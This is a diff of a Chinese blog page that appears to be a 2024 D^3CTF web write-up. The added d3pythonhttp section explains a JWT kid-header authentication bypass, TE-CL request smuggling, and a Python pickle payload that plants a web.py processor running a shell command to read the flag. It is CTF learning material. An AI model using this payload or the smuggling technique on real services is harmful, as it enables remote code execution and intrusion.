@@ -157,7 +157,7 @@
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-          2024-05-02 12:14:46
+          2024-05-02 18:11:29
         </span>
         
               <span class="post-tags">
@@ -209,7 +209,53 @@
 <p>一个用于展示static目录的demo</p>
 <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;embed&quot;</span></span><br><span class="line">	_ <span class="string">&quot;embed&quot;</span></span><br><span class="line">	<span class="string">&quot;io/fs&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	useOS := <span class="built_in">len</span>(os.Args) &gt; <span class="number">1</span> &amp;&amp; os.Args[<span class="number">1</span>] == <span class="string">&quot;live&quot;</span></span><br><span class="line">	http.Handle(<span class="string">&quot;/&quot;</span>, http.FileServer(getFileSystem(useOS)))</span><br><span class="line">	http.ListenAndServe(<span class="string">&quot;:8888&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed static</span></span><br><span class="line"><span class="keyword">var</span> embedFiles embed.FS</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getFileSystem</span><span class="params">(useOS <span class="type">bool</span>)</span></span> http.FileSystem &#123;</span><br><span class="line">	<span class="keyword">if</span> useOS &#123;		<span class="comment">// live模式类似于hot-deploy, 直接读取宿主机环境上的static目录进行显示</span></span><br><span class="line">		log.Print(<span class="string">&quot;using live mode&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> http.FS(os.DirFS(<span class="string">&quot;static&quot;</span>))</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	log.Print(<span class="string">&quot;using embed mode&quot;</span>)</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 直接使用打包进二进制程序的static目录</span></span><br><span class="line">	fsys, err := fs.Sub(embedFiles, <span class="string">&quot;static&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> http.FS(fsys)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
 </ul>
-<h3 id="d3pythonhttp（复现）"><a href="#d3pythonhttp（复现）" class="headerlink" title="d3pythonhttp（复现）"></a>d3pythonhttp（复现）</h3>
+<h3 id="d3pythonhttp（复现）"><a href="#d3pythonhttp（复现）" class="headerlink" title="d3pythonhttp（复现）"></a>d3pythonhttp（复现）</h3><p>考点：JWT鉴权绕过、请求走私、pickle反序列化</p>
+<h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>鉴权依靠jwt，在<code>/login</code>路由下生成jwt的token，在<code>/admin</code>路由下进行<code>verify_token</code></p>
+<p>一开始想着怎么进行<code>fronted_key</code>泄露，其实这是一个逻辑洞的绕过</p>
+<p>根据JWT的结构，头部部分可以进行伪造，而key的获取是依靠于头部中的kid字段来确定的，即我们可以随便指定一个路径使得get_key触发异常直接pass，然后返回空</p>
+<p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021807430.png" alt="image-20240502145337969"></p>
+<h4 id="走私绕过"><a href="#走私绕过" class="headerlink" title="走私绕过"></a>走私绕过</h4><p>前后端中对于<code>Backdoor..</code>字符串的处理不同，我们需要利用前端和后端对于TE的解析差异进行走私</p>
+<p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021807105.png" alt="image-20240502163953630"></p>
+<p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021807442.png" alt="image-20240502163920761"></p>
+<p>对于TE头的具体解析差异如下：</p>
+<p>前端全转小写</p>
+<p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021807391.png" alt="image-20240502164207102"></p>
+<p>后端对大小写敏感</p>
+<p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021807852.png" alt="image-20240502164232879"></p>
+<p>也就是说，我们可以使用大小写使得TE头在前端成功解析，但是在后端使用CL解析，即TE-CL走私</p>
+<ul>
+<li>关于TE头</li>
+</ul>
+<p>设置了 <code>Transfer-Encoding: chunked</code> 后，请求主体按一系列块的形式发送，并将省略 <code>Content-Length</code>。在每个块的开头需要用十六进制数指明当前块的长度，数值后接 <code>\r\n</code>（占 2 字节），然后是块的内容，再接 <code>\r\n</code> 表示此块结束。最后用长度为 0 的块表示终止块。终止块后是一个 trailer，由 0 或多个实体头组成，可以用来存放对数据的数字签名等。</p>
+<p>格式如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure>
+
+<p>例子：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-stylus"><span class="selector-tag">b</span></span></span><br><span class="line"><span class="language-stylus">q=smuggling</span></span><br><span class="line"><span class="language-stylus"><span class="number">6</span></span></span><br><span class="line"><span class="language-stylus">hahaha</span></span><br><span class="line"><span class="language-stylus"><span class="number">0</span></span></span><br><span class="line"><span class="language-stylus"><span class="selector-attr">[空白行]</span></span></span><br><span class="line"><span class="language-stylus"><span class="selector-attr">[空白行]</span></span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\nHost: 1.com\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\n\r\nb\r\nq=smuggling\r\n6\r\nhahaha\r\n0\r\n\r\n</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="webpy下的内存马"><a href="#webpy下的内存马" class="headerlink" title="webpy下的内存马"></a>webpy下的内存马</h4><p>算是第一次碰到这个框架</p>
+<p>查看源码，可以发现有<code>processors</code>的变量，类似于一个<code>filter</code>的用法</p>
+<p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021653498.png" alt="image-20240502164858824"></p>
+<p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021653263.png" alt="image-20240502165248494"></p>
+<p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021653911.png" alt="image-20240502165332488"></p>
+<p>生成opcode，添加一个Processor进去</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exploit</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>, (<span class="string">&quot;app.add_processor((lambda self : __import__(&#x27;os&#x27;).popen(&#x27;cat /home/ctf/flag&#x27;).read()))&quot;</span>,)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">exp = exploit()</span><br><span class="line">exp_str = pickle.dumps(exp, protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(exp_str))</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p>感觉使用bp很容易出问题，所以想方设法使用脚本发包</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&mid=2247485683&idx=1&sn=59a3ab77c368f4a06173f06ba6acc8f4&chksm=cf5ee8a5f82961b3369d0442ef2b09e0c09133192349b7d76f1c829458cb0c66aed0723b4a40&mpshare=1&scene=23&srcid=05027by9GN73PBRo2Fb8sIO9&sharer_shareinfo=e4946fbe5ac0cfc0ad85a20ab1ae04a3&sharer_shareinfo_first=e4946fbe5ac0cfc0ad85a20ab1ae04a3#rd">https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&amp;mid=2247485683&amp;idx=1&amp;sn=59a3ab77c368f4a06173f06ba6acc8f4&amp;chksm=cf5ee8a5f82961b3369d0442ef2b09e0c09133192349b7d76f1c829458cb0c66aed0723b4a40&amp;mpshare=1&amp;scene=23&amp;srcid=05027by9GN73PBRo2Fb8sIO9&amp;sharer_shareinfo=e4946fbe5ac0cfc0ad85a20ab1ae04a3&amp;sharer_shareinfo_first=e4946fbe5ac0cfc0ad85a20ab1ae04a3#rd</a></p>
+
       </div>
       
         <div class="prev-or-next">
@@ -224,7 +270,7 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-              2024-05-02 12:14:46
+              2024-05-02 18:11:29
             </span>
             
                   <span class="post-tags">
@@ -258,7 +304,7 @@
     <div class="title">Contents</div>
     <div class="catalog-content">
       
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2024-D-3CTF-Web-WP%E5%92%8C%E5%A4%8D%E7%8E%B0"><span class="toc-text">2024-D^3CTF-Web-WP和复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Stack-Overflow"><span class="toc-text">Stack-Overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#doctor%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-text">doctor（复现）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B0%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-text">新知识点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#d3pythonhttp%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-text">d3pythonhttp（复现）</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2024-D-3CTF-Web-WP%E5%92%8C%E5%A4%8D%E7%8E%B0"><span class="toc-text">2024-D^3CTF-Web-WP和复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Stack-Overflow"><span class="toc-text">Stack-Overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#doctor%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-text">doctor（复现）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B0%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-text">新知识点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#d3pythonhttp%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-text">d3pythonhttp（复现）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B5%B0%E7%A7%81%E7%BB%95%E8%BF%87"><span class="toc-text">走私绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#webpy%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">webpy下的内存马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-text">EXP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol></li></ol>
       
     </div>
   </div>
